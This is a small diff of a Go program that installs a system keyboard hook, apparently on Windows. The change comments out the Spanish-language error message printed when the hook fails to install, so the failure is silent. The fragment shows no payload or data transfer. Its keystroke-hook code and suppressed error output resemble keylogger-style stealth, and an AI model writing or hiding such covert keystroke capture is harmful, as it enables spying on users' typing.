@@ -280,7 +280,7 @@ func main() {
 		0,
 	)
 	if hKey == 0 {
-		fmt.Println("Error al instalar el hook de teclado:", err)
+		//fmt.Println("Error al instalar el hook de teclado:", err)
 		return
 	}
 	keyboardHookID = syscall.Handle(hKey)
